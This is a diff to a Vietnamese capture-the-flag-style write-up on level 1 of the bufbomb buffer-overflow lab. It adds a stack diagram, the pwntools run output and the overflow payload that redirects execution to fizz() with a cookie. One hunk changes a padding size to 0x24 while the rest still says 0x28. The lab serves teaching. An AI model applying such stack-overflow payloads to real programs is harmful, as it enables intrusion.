@@ -46,12 +46,11 @@ Tiếp theo, để quyết định được payload để nhập vào chương t
 |           ebp (getbuf)          |---> ebp của hàm getbuf()
 +---------------------------------+
                .
-               . => 0x28 bytes 
+               . => 0x24 bytes 
                .
 +---------------------------------+
 |              v1                 |---> top của stack
 +---------------------------------+
-
 ```  
 > Tương tự ở level 0, payload của chúng ta sẽ có độ dài là `0x28 + 0x4 + 0x4` với `4` bytes cuối là địa chỉ của hàm `fizz()`.
 
@@ -105,4 +104,49 @@ with open('payload.txt', 'wb') as f:
 
 main_handler.sendline(exploit_payload)
 main_handler.interactive()
+```  
+
+Stack khi bị overflow:  
 ```
++---------------------------------+
+|             cookie              |---> tham số thứ nhất của hàm fizz()
++---------------------------------+
+|             'AAAA'              |---> return address của hàm fizz()
++---------------------------------+
+|      địa chỉ của hàm fizz()     |---> return address của hàm getbuf()
++---------------------------------+
+|             'AAAA'              |---> ebp của hàm getbuf()
++---------------------------------+
+               .
+               . => 0x28 bytes 
+               .
++---------------------------------+
+|             'AAAA'              |---> top của stack
++---------------------------------+
+```  
+
+Chạy script.  
+```
+└─$ ./level1.py
+[*] '/mnt/f/src-team-1/bufbomb'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process './bufbomb': pid 29
+[+] Starting local process './makecookie': pid 31
+[*] Process './makecookie' stopped with exit code 0 (pid 31)
+0x31f21393
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18\x9b\x13\x80AAAA\x93\x13\xf21'
+[*] Switching to interactive mode
+[*] Process './bufbomb' stopped with exit code 0 (pid 29)
+Userid: 09821978
+Cookie: 0x31f21393
+Type string:Fizz!: You called fizz(0x31f21393)
+VALID
+NICE JOB!
+[*] Got EOF while reading in interactive
+$
+```  
+> Thành công!
